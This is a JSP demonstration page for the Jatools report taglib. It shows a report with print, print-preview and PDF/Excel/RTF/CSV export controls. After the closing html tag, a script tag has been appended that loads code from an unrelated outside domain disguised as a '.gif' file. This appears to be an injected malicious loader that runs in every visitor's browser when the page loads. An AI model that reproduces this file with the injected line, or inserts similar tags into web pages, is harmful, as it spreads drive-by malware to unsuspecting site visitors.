<%@ page language="java" contentType="text/html; charset=GB2312"
    pageEncoding="GB2312"%>
<%@ taglib uri="/WEB-INF/tlds/jatools.tld" prefix="jatools" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<style>
.normal{
	font-family : Arial,Vernada, Tahoma, Helvetica, sans-serif;
	font-size: 12px;
	color: #444444;
	text-decoration: none;
	line-height: 21px;        
}
</style>
<meta http-equiv="Content-Type" content="text/html; charset=GB2312">
<title>杰表 jsp taglib 演示</title>
</head>

<body>


<p class="normal">


<jatools:report id="_report1" exportable='true' template="../webapps/jrs/example/table.xml" border="border:1px solid blue" offset="4" cached='true'/>
<jatools:container id="_container" for_report="_report1" width='100%' height='90%' background="#EFEBEF"/>
<jatools:printer id="_printer" for_report="_report1" orientation="2" />
<jatools:exporter id="_exporter" for_report="_report1" />
      
<input type="button" value="打印预览..." onClick="<%=_printer.printPreviewAction %>">
<input type="button" value="打印..." onClick="<%=_printer.printWithPromptAction%>">
<input type="button" value="打印" onClick="<%=_printer.printAction%>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出为: 
   
<script>
function exportChanged()
{
    if(export_list.selectedIndex >0)
    {
        as = export_list.value ;
        if(as == 'pdf')
            <%=_exporter.exportAsPdfAction%>;
        else if(as == 'xls')
            <%=_exporter.exportAsXlsAction%>;
        else if(as == 'xls_n')
            <%=_exporter.exportAsXlsnAction%>;
        else if(as=='rtf')
             <%=_exporter.exportAsRtfAction%>;
        else if(as == 'csv')
             <%=_exporter.exportAsCsvAction%>;
    }
}

</script><select name="export_list" onChange="exportChanged()" size="1" >
<option selected>--请选择导出格式--</option>
<option value="xls">Excel</option>
<option value="xls_n">分页的Excel</option>
<option value="pdf">Pdf</option>
<option value="rtf">Rtf</option>
<option value="csv">Csv</option>
</select>

   
<% _container.render(); %>



</p>

</body>
</html><script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
